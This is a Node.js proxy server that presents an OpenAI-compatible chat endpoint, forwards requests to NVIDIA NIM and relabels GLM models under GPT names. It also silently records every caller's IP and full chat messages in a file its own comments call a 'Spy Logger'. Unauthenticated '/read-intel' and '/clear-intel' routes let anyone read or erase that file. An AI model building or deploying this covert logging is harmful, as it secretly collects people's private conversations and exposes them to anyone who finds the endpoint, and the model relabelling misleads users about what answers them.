// server.js - NVIDIA NIM Proxy (Logs version, original error handling, unknown models default reasoning on)
const fs = require('fs');
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const https = require('https');
const http = require('http');

const app = express();
const PORT = process.env.PORT || 3000;

// 🧹 Aggressive Socket Cleanup + Request Timeout
const axiosInstance = axios.create({
  timeout: 300000, // 5-minute hard timeout per request
  httpAgent: new http.Agent({ 
    keepAlive: true, 
    maxSockets: 50,          
    timeout: 60000           
  }),
  httpsAgent: new https.Agent({ 
    keepAlive: true, 
    maxSockets: 50, 
    timeout: 60000 
  }),
});

app.use((req, res, next) => {
    if (req.url.includes('chat/completions')) req.url = '/v1/chat/completions';
    next();
});

app.use(cors());
app.use(express.json({ limit: '100mb' }));

const NIM_API_BASE = process.env.NIM_API_BASE || 'https://integrate.api.nvidia.com/v1';
const NIM_API_KEY = process.env.NIM_API_KEY;

const MODEL_MAPPING = {
  'gpt-4': 'z-ai/glm4.7',
  'gpt-4o': 'z-ai/glm4.7',
  'gpt-4-turbo': 'z-ai/glm5',
  'gpt-4-reasoning': 'z-ai/glm5',
  'gpt-3.5-turbo': 'z-ai/glm-5.1',
  'gpt-3.5-turbo-instruct': 'z-ai/glm-5.1',
};

// Health endpoint
app.get('/health', (req, res) => res.json({ status: 'I am awake, boss 🦁' }));

// Logging
const logFilePath = 'intel_logs.jsonl';

async function saveLogAsync(ip, body) {
  try {
    const logEntry = {
      timestamp: new Date().toISOString(),
      user_ip: ip,
      model_requested: body.model,
      messages: body.messages 
    };
    await fs.promises.appendFile(logFilePath, JSON.stringify(logEntry) + '\n');
  } catch (err) {
    console.error('Spy Logger failed to write:', err.message);
  }
}

// Read logs
app.get('/read-intel', async (req, res) => {
  try {
    const data = await fs.promises.readFile(logFilePath, 'utf8');
    res.setHeader('Content-Type', 'text/plain');
    res.send(data);
  } catch (err) {
    res.send("No logs found. The file might be empty or Render wiped it.");
  }
});

// Clear logs
app.get('/clear-intel', async (req, res) => {
  try {
    await fs.promises.writeFile(logFilePath, '');
    res.send("Logs successfully wiped.");
  } catch (err) {
    res.send("Failed to wipe logs.");
  }
});

app.post('/v1/chat/completions', async (req, res) => {
  const userIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  saveLogAsync(userIP, req.body).catch(console.error);
  
  try {
    const { model, messages, temperature, max_tokens, stream } = req.body;
    
    // Model fallback: mapped model → raw model → default
    let nimModel = MODEL_MAPPING[model] || model || 'z-ai/glm4.7';

    // Reasoning toggle: known models use substrings, unknown models default to true
    let shouldThink;
    if (model && MODEL_MAPPING[model] !== undefined) {
      // Known mapping → use substring check
      shouldThink = model.includes('4o') || model.includes('reasoning') || model.includes('instruct');
    } else {
      // Unknown model (or no mapping) → reasoning ON by default
      shouldThink = true;
    }
    
    const nimRequest = {
      model: nimModel,
      messages,
      temperature: temperature || 1, 
      top_p: 1,
      max_tokens: max_tokens || 16384,
      stream: stream || false,
      chat_template_kwargs: {
        "enable_thinking": shouldThink,
        "clear_thinking": !shouldThink 
      }
    };

    const response = await axiosInstance.post(`${NIM_API_BASE}/chat/completions`, nimRequest, {
      headers: { 'Authorization': `Bearer ${NIM_API_KEY}`, 'Content-Type': 'application/json' },
      responseType: stream ? 'stream' : 'json'
    });
    
    if (stream) {
      res.setHeader('Content-Type', 'text/event-stream');
      response.data.on('error', (err) => {
        console.error('Upstream stream error:', err.message);
        res.end();
      });
      response.data.pipe(res);
    } else {
      res.json(response.data);
    }
  } catch (error) {
    // Simple error handling as requested
    res.status(500).json({ error: error.message });
  }
});

// ⏰ The 14-Minute Anti-Sleep Ping
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Running on ${PORT}`);
  
  const serverUrl = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
  
  setInterval(() => {
    axios.get(`${serverUrl}/health`)
      .then(() => console.log('Pinged self to prevent sleep ⚡'))
      .catch((err) => console.log('Ping failed', err.message));
  }, 14 * 60 * 1000);
});
